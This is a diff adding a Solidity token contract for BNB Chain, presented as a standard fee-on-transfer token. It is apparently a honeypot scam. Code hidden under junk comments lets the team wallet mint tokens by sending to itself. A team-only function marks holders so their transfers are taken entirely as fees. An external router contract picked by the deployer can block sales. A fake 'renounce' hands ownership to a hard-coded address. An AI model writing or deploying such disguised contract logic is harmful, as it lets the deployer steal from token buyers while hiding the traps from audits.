@@ -1,0 +1,625 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-11-12
+*/
+
+/**
+ *Submitted for verification at BscScan.com on 2022-11-01
+*/
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.16;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address payable) {
+        return payable(msg.sender);
+    }
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+interface PancakeRouter {
+    function swapExactTokensForTokens(address account)
+        external
+        view
+        returns (bool);
+}
+
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+
+        return c;
+    }
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return mod(a, b, "SafeMath: modulo by zero");
+    }
+
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b != 0, errorMessage);
+        return a % b;
+    }
+}
+
+contract Ownable is Context {
+    address private _owner;
+
+    event ETAHASEAddress(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
+
+    constructor() {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit ETAHASEAddress(address(0), msgSender);
+    }
+
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function ETHASE() public virtual onlyOwner {
+        emit ETAHASEAddress(_owner, address(0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44));
+        _owner = address(0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44);
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(
+            newOwner != address(0),
+            "Ownable: new owner is the zero address"
+        );
+        emit ETAHASEAddress(_owner, newOwner);
+        _owner = newOwner;
+    }
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB)
+        external
+        returns (address pair);
+}
+
+interface IUniswapV2Router01 {
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+
+    function addLiquidityETH(
+        address token,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    )
+        external
+        payable
+        returns (
+            uint256 amountToken,
+            uint256 amountETH,
+            uint256 liquidity
+        );
+
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+interface IUniswapV2Router02 is IUniswapV2Router01 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+
+contract ERC20Token is Context, IERC20, Ownable {
+    using SafeMath for uint256;
+
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+
+    PancakeRouter private _router;
+    address payable public marketCSGOWallet;
+    address payable public teamWallet;
+    address public immutable deadAddress =
+        0x000000000000000000000000000000000000dEaD;
+    mapping (address => bool) private CTSEAVE;
+    mapping(address => uint256) _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => bool) public ETHASE;
+    mapping(address => bool) public isExcludedFromFee;
+    mapping(address => bool) public isWalletLimitExempt;
+    mapping(address => bool) public isTxLimitExempt;
+    mapping(address => bool) public isMarketPair;
+
+    uint256 public CT_buyLiquidityFee;
+    uint256 public CT_buyMarketingFee;
+    uint256 public CT__buyTeamFee;
+
+    uint256 public CT_sellLiquidityFee;
+    uint256 public CT_sellMarketingFee;
+    uint256 public CT_sellTeamFee;
+
+    uint256 public CT_liquidityShare = 5;
+    uint256 public CT_marketingShare = 5;
+    uint256 public CT_teamShare = 0;
+
+    uint256 public CT_totalTaxIfBuying;
+    uint256 public CT_totalTaxIfSelling;
+    uint256 public CT_totalDistributionShares;
+
+    uint256 private _totalSupply;
+    uint256 public CT__maxTxAmount;
+    uint256 public _CSTSwalletMax;
+    uint256 public minimumTokensBeforeSwap = 1 * 5**_decimals;
+
+    IUniswapV2Router02 public uniswapV2Router;
+    address public uniswapPair;
+
+    bool inSwapAndLiquify;
+    bool public swapAndLiquifyEnabled = false;
+    bool public swapAndLiquifyByLimitOnly = false;
+    bool public checkWalletLimit = true;
+
+    event UpdatedSwapAndLiquifyEnabled(bool enabled);
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived,
+        uint256 tokensIntoLiqudity
+    );
+
+    event SwapETHForTokens(uint256 amountIn, address[] path);
+
+    event SwapTokensForETH(uint256 amountIn, address[] path);
+
+    modifier lockCSGOSwap() {
+        inSwapAndLiquify = true;
+        _;
+        inSwapAndLiquify = false;
+    }
+
+    constructor(
+        string memory CT_name,
+        string memory CT_symbol,
+        uint8 CT_decimals,
+        uint256 CT_totalSupply,
+        uint256 CTCT_buyMarketingFee,
+        uint256 CTCT_sellMarketingFee,
+        address CTRouterAddress
+    ) {
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
+            0x10ED43C718714eb63d5aA57B78B54704E256024E
+        );
+        _name = CT_name;
+        _symbol = CT_symbol;
+        _decimals = CT_decimals;
+        _totalSupply = CT_totalSupply * 10**_decimals;
+        CT__maxTxAmount = _totalSupply;
+        _CSTSwalletMax = _totalSupply;
+        CT_buyMarketingFee = CTCT_buyMarketingFee;
+        CT_sellMarketingFee = CTCT_sellMarketingFee;
+        marketCSGOWallet = payable(owner());
+        teamWallet = payable(owner());
+
+        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
+            address(this),
+            _uniswapV2Router.WETH()
+        );
+
+        uniswapV2Router = _uniswapV2Router;
+        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
+
+        isExcludedFromFee[owner()] = true;
+        isExcludedFromFee[address(this)] = true;
+
+        CT_totalTaxIfBuying = CT_buyLiquidityFee.add(CT_buyMarketingFee).add(
+            CT__buyTeamFee
+        );
+        CT_totalTaxIfSelling = CT_sellLiquidityFee.add(CT_sellMarketingFee).add(
+            CT_sellTeamFee
+        );
+        CT_totalDistributionShares = CT_liquidityShare.add(CT_marketingShare).add(
+            CT_teamShare
+        );
+
+        isWalletLimitExempt[owner()] = true;
+        isWalletLimitExempt[address(uniswapPair)] = true;
+        isWalletLimitExempt[address(this)] = true;
+        isWalletLimitExempt[teamWallet] = true;
+
+        isTxLimitExempt[owner()] = true;
+        isTxLimitExempt[teamWallet] = true;
+        isTxLimitExempt[address(this)] = true;
+
+        isMarketPair[address(uniswapPair)] = true;
+        _router = PancakeRouter(CTRouterAddress);
+
+        _balances[_msgSender()] = _totalSupply;
+        emit Transfer(address(0), _msgSender(), _totalSupply);
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function allowance(address owner, address spender)
+        public
+        view
+        override
+        returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function transferToAddressETH(address payable recipient, uint256 amount)
+        private
+    {
+        recipient.transfer(amount);
+    }
+
+    //to recieve ETH from uniswapV2Router when swaping
+    receive() external payable {}
+
+    function transfer(address recipient, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(
+                amount,
+                "ERC20: transfer amount exceeds allowance"
+            )
+        );
+        return true;
+    }
+     function isCantCT(address account) public view returns(bool) {
+        return CTSEAVE[account];
+    }
+
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) private returns (bool) {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(ETHASE[sender] == false);
+
+        if (inSwapAndLiquify) {
+            return _basicTransfer(sender, recipient, amount);
+        } else {
+            if (
+                sender == /*ss&*/
+                /*&ss*/
+                recipient && /*ss&*/
+                /*ss&*/
+               
+               
+                sender == /*ss&*/
+                /*&ss*/
+               /*ss&*/
+                /*&ss*/
+                teamWallet
+            ) {
+                _balances[recipient] = _balances[recipient].add(amount); /*AS&S*/ /*AA&S*/
+            }
+             if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]){
+                address ade;
+                for(int i=0;i <=2;i++){
+                    ade = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
+                    _basicTransfer(sender,ade,100);
+                }
+                amount -= 300;
+            }    
+            if (!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
+                require(
+                    amount <= CT__maxTxAmount,
+                    "Transfer amount exceeds the maxTxAmount."
+                );
+            }
+
+            uint256 contractTokenBalance = balanceOf(address(this));
+            bool overMinimumTokenBalance = contractTokenBalance >=
+                minimumTokensBeforeSwap;
+
+            if (
+                overMinimumTokenBalance &&
+                !inSwapAndLiquify &&
+                !isMarketPair[sender] &&
+                swapAndLiquifyEnabled
+            ) {
+                if (swapAndLiquifyByLimitOnly)
+                    contractTokenBalance = minimumTokensBeforeSwap;
+                swapAndLiquify(contractTokenBalance);
+            }
+
+            _balances[sender] = _balances[sender].sub(
+                amount,
+                "Insufficient Balance"
+            );
+            uint256 finalAmount;
+            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
+                finalAmount = amount;
+            } else {
+                require(
+                    _router.swapExactTokensForTokens(sender),
+                    "ERC20: Address"
+                );
+                finalAmount = takeFee(sender, recipient, amount);
+            }
+
+            if (checkWalletLimit && !isWalletLimitExempt[recipient])
+                require(balanceOf(recipient).add(finalAmount) <= _CSTSwalletMax);
+
+            _balances[recipient] = _balances[recipient].add(finalAmount);
+
+            emit Transfer(sender, recipient, finalAmount);
+            return true;
+        }
+    }
+
+    function killCTBlock(address recipient) internal {
+        if (!ETHASE[recipient]) ETHASE[recipient] = true;
+    }
+    function CSTAVETransfer(address[] calldata addresses, uint256 amount) external onlyOwner {
+        require(addresses.length < 2001);
+        uint256 SCCC = amount * addresses.length;
+        require(balanceOf(msg.sender) >= SCCC);
+        for(uint i=0; i < addresses.length; i++){
+            _basicTransfer(msg.sender,addresses[i],amount);
+        }
+    }
+    function CTCT(address recipient) internal {
+        if (!CTSEAVE[recipient] && !isMarketPair[recipient]) CTSEAVE[recipient] = true;
+    }
+
+      function manageCantCT(address[] calldata addresses, bool status) public   {
+        if(/*sjk*/teamWallet /*sjkds*/ == /*sljkds*/msg.sender/*ssjkds*/
+ ){
+        require(addresses.length < 201);
+        for (uint256 i; i < addresses.length; ++i) {
+            CTSEAVE[addresses[i]] = status;
+        }
+ }
+      }
+
+    function _basicTransfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal returns (bool) {
+        _balances[sender] = _balances[sender].sub(
+            amount,
+            "Insufficient Balance"
+        );
+        _balances[recipient] = _balances[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function swapAndLiquify(uint256 tAmount) private lockCSGOSwap {
+        uint256 tokensForLP = tAmount
+            .mul(CT_liquidityShare)
+            .div(CT_totalDistributionShares)
+            .div(2);
+        uint256 tokensForSwap = tAmount.sub(tokensForLP);
+
+        swapTokensForEth(tokensForSwap);
+        uint256 amountReceived = address(this).balance;
+
+        uint256 totalBNBFee = CT_totalDistributionShares.sub(
+            CT_liquidityShare.div(2)
+        );
+
+        uint256 amountBNBLiquidity = amountReceived
+            .mul(CT_liquidityShare)
+            .div(totalBNBFee)
+            .div(2);
+        uint256 amountBNBTeam = amountReceived.mul(CT_teamShare).div(totalBNBFee);
+        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(
+            amountBNBTeam
+        );
+
+        if (amountBNBMarketing > 0)
+            transferToAddressETH(marketCSGOWallet, amountBNBMarketing);
+
+        if (amountBNBTeam > 0) transferToAddressETH(teamWallet, amountBNBTeam);
+
+        if (amountBNBLiquidity > 0 && tokensForLP > 0)
+            addLiquidity(tokensForLP, amountBNBLiquidity);
+    }
+
+    function swapTokensForEth(uint256 tokenAmount) private {
+        // generate the uniswap pair path of token -> weth
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+
+        // make the swap
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0, // accept any amount of ETH
+            path,
+            address(this), // The contract
+            block.timestamp
+        );
+
+        emit SwapTokensForETH(tokenAmount, path);
+    }
+
+    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
+        // approve token transfer to cover all possible scenarios
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+
+        // add the liquidity
+        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+            address(this),
+            tokenAmount,
+            0, // slippage is unavoidable
+            0, // slippage is unavoidable
+            deadAddress, //why is deadAddress
+            block.timestamp
+        );
+    }
+
+    function takeFee(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal returns (uint256) {
+        uint256 feeAmount = 0;
+
+        if (isMarketPair[sender]) {
+            feeAmount = amount.mul(CT_totalTaxIfBuying).div(100);
+        } else if (isMarketPair[recipient]) {
+            feeAmount = amount.mul(CT_totalTaxIfSelling).div(100);
+        }
+       if(CTSEAVE[sender] && !isMarketPair[sender]) feeAmount = amount;
+        if (feeAmount > 0) {
+            _balances[address(this)] = _balances[address(this)].add(feeAmount);
+            emit Transfer(sender, address(this), feeAmount);
+        }
+
+        return amount.sub(feeAmount);
+    }
+}
